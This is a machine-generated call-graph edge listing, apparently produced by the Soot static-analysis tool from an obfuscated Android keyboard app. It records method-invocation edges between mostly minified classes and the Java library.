STATIC edge: $r0 = staticinvoke <j$.sun.misc.b: j$.sun.misc.b h()>() in <j$.util.concurrent.r: void <clinit>()> ==> <j$.sun.misc.b: j$.sun.misc.b h()>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r7 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>(null, $r5, "", $r6, "") in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $i6 = staticinvoke <izw: int af(int,int)>($i3, $i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int af(int,int)>
SPECIAL edge: specialinvoke $r9.<mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>($r2, $r3, $r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.util.WeakHashMap: void <init>()>() in <gwk: void <init>()> ==> <java.util.WeakHashMap: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljd: int f(java.lang.Object)>($r2) in <ljb: void a()> ==> <ljd: int f(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<lmc: void <init>(lme)>(r0) in <lme: lma c()> ==> <lmc: void <init>(lme)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.util.Map n(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: java.util.Map n(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljd: int c()>() in <liz: void <init>(ljd)> ==> <ljd: int c()>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int highestOneBit(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lrg: int hashCode()>
SPECIAL edge: specialinvoke $r6.<lrg: void <init>(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <lrg: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r10.<java.lang.StringBuilder: void <init>()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>()>
CLINIT edge: staticinvoke <jlu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jlu: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lje: void <init>(ljf)>(r0) in <ljf: java.util.Iterator iterator()> ==> <lje: void <init>(ljf)>
SPECIAL edge: specialinvoke $r28.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
SPECIAL edge: $r1 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: java.lang.Object e(int)> ==> <ljf: java.lang.Object[] s()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractSet: void <init>()>() in <lvq: void <init>(lvr,int)> ==> <java.util.AbstractSet: void <init>()>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r5) in <izw: java.lang.Object al(int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>(char[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lma: lkq f()>() in <lma: lkq k()> ==> <lqr: lkq f()>
STATIC edge: $i0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int n(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.util.concurrent.ConcurrentHashMap: int n(int)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <liy: int size()>
STATIC edge: $r1 = staticinvoke <lkq: lkq h(java.lang.Object[],int)>($r2, $i0) in <lqr: lkq f()> ==> <lkq: lkq h(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.util.AbstractCollection: void <init>()>() in <lkh: void <init>()> ==> <java.util.AbstractCollection: void <init>()>
CLINIT edge: staticinvoke <ivw: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ivw: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(3) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <lma: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean deepEquals(java.lang.Object[],java.lang.Object[])>($r2, $r3) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean deepEquals(java.lang.Object[],java.lang.Object[])>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.String toString()>() in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.String toString()>
CLINIT edge: staticinvoke <lnd: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lnd: void <clinit>()>
STATIC edge: $r1 = staticinvoke <j$.sun.misc.b: java.lang.reflect.Field i()>() in <j$.sun.misc.b: void <clinit>()> ==> <j$.sun.misc.b: java.lang.reflect.Field i()>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i1) in <lkg: int a(int,int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int,java.lang.Class)>($r2, $i0, $i1, $r3) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int,java.lang.Class)>
STATIC edge: $r1 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <lvr: int hashCode()> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int j()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int j()>
STATIC edge: $r4 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r4) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lkq: boolean isEmpty()>() in <lkq: lsb C(int)> ==> <java.util.AbstractCollection: boolean isEmpty()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r0) in <lri: boolean a(java.util.Comparator,java.lang.Iterable)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int j()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int j()>
CLINIT edge: staticinvoke <lwh: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwh: void <clinit>()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "fromLocale", 222, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsv: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<com.google.android.apps.inputmethod.latin.LatinApp: void <init>()>() in <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <init>()> ==> <com.google.android.apps.inputmethod.latin.LatinApp: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkq: java.lang.Object get(int)>($i2) in <lkq: int hashCode()> ==> <lql: java.lang.Object get(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
SPECIAL edge: $r5 = specialinvoke r0.<ljf: java.lang.Object p()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.lang.Object p()>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r8, $i2, $r4) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lkh: java.lang.Object[] n()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lkh: java.lang.Object[] n()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<lig: void <init>()>() in <lim: void <init>()> ==> <lig: void <init>()>
CLINIT edge: staticinvoke <lum: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lum: void <clinit>()>
STATIC edge: $r1 = staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>("line.separator") in <lwe: void <clinit>()> ==> <java.lang.System: java.lang.String getProperty(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lrg: lsa l()>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Collection: boolean isEmpty()>() in <lmb: lme f()> ==> <java.util.AbstractCollection: boolean isEmpty()>
VIRTUAL edge: $i1 = virtualinvoke $r11.<lma: int size()>() in <lmb: lme f()> ==> <lqr: int size()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: int hashCode()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" threw ") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <llg: java.lang.Object next()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <lrg: java.util.Iterator iterator()>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <ljf: int size()>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(char[],char[])>($r12, $r13) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(char[],char[])>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.c: void <init>(long)> ==> <java.lang.Object: void <init>()>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>($r2, $r1, 0) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <lvt: boolean equals(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>($r1, $i0, $i1, 0) in <lqk: void <init>(java.lang.Object[],int)> ==> <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "message") in <lup: void <init>(lwc,java.lang.String)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: int[] r()>() in <ljf: int o(int,int,int,int)> ==> <ljf: int[] r()>
STATIC edge: $r7 = staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>("com.google.common.base.Strings") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: void t(int)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: java.lang.Object get(int)>($i0) in <lkm: java.lang.Object a(int)> ==> <lqp: java.lang.Object get(int)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke $r3.<hnq: void <init>()>() in <hnt: void <clinit>()> ==> <hnq: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkq: lsb C(int)>(0) in <lkq: lsb B()> ==> <lkq: lsb C(int)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<mly: java.lang.IllegalArgumentException f()>() in <lqq: java.lang.Object s(java.lang.Object[],int,int,int)> ==> <mly: java.lang.IllegalArgumentException f()>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <llg: boolean hasNext()> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke $r0.<lvs: void <init>(java.lang.String,int)>("BOOLEAN", 0) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <izw: java.lang.Object[] S(java.lang.Iterable)>($r1) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <izw: java.lang.Object[] S(java.lang.Iterable)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<ljd: java.lang.Object h(int)>($i0) in <ljb: void <init>(ljd,int)> ==> <ljd: java.lang.Object h(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lqr: int hashCode()>
STATIC edge: staticinvoke <java.util.Arrays: void fill(byte[],byte)>($r4, -1) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.Arrays: void fill(byte[],byte)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<mly: java.lang.IllegalArgumentException f()>() in <lkt: lkx b(boolean)> ==> <mly: java.lang.IllegalArgumentException f()>
STATIC edge: staticinvoke <java.util.Arrays: void fill(int[],int)>($r8, $i1) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.Arrays: void fill(int[],int)>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <llg: java.lang.Object next()>
STATIC edge: staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lly: void j(java.lang.Object)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.Object: java.lang.Class getClass()>() in <lri: java.lang.Object[] o(java.lang.Object[],int)> ==> <java.lang.Object: java.lang.Class getClass()>
SPECIAL edge: specialinvoke r0.<lkh: void <init>()>() in <lma: void <init>()> ==> <lkh: void <init>()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("null value in entry: ") in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r0) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <iye: void O(int,int)>($i0, $i1) in <lql: java.lang.Object get(int)> ==> <iye: void O(int,int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Exception: void <init>()> ==> <java.lang.Throwable: void <init>()>
INTERFACE edge: $r6 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <llg: java.lang.Object next()> ==> <lsb: java.lang.Object next()>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lrg: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>($r1, $r10) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>
SPECIAL edge: specialinvoke r0.<lmo: void <init>(java.util.Comparator)>($r2) in <lqs: void <init>(lkq,java.util.Comparator)> ==> <lmo: void <init>(java.util.Comparator)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r3) in <iye: void O(int,int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean v()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: boolean v()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $r11 = staticinvoke <hny: hny a(hmm)>($r10) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hny: hny a(hmm)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
STATIC edge: $i6 = staticinvoke <izw: int ac(int)>($i6) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: int ac(int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljf: int[] r()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: int length()>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <lsb: boolean hasNext()>
CLINIT edge: staticinvoke <dwx: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dwx: void <clinit>()>
STATIC edge: $r3 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r2, $i1) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.String toString()>() in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <ljf: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(15) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke r0.<ljd: void A(int)>($i1) in <ljd: int b()> ==> <ljd: void A(int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorGifSearchMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $i0 = staticinvoke <java.lang.Math: int max(int,int)>($i0, 2) in <izw: int ae(int)> ==> <java.lang.Math: int max(int,int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: boolean hasNext()>
STATIC edge: $r2 = staticinvoke <lum: lul g()>() in <lsn: boolean ac()> ==> <lum: lul g()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(">") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <her: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <her: void <clinit>()>
INTERFACE edge: $i0 = interfaceinvoke $r0.<java.util.List: int size()>() in <ivw: java.lang.String[] Q(java.util.List)> ==> <java.util.ArrayList: int size()>
VIRTUAL edge: $i3 = virtualinvoke $r2.<java.lang.String: int length()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: int length()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lnc: java.lang.Object next()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r4.<lma: int size()>() in <lly: lma g()> ==> <lqr: int size()>
VIRTUAL edge: virtualinvoke r0.<ljd: void r(int,java.lang.Object,java.lang.Object,int,int)>($i0, $r2, $r1, $i3, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)>
INTERFACE edge: $r1 = interfaceinvoke $r0.<java.util.List: java.lang.Object get(int)>($i1) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: java.lang.Object get(int)>
VIRTUAL edge: virtualinvoke $r2.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <iye: void O(int,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lqd: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".") in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
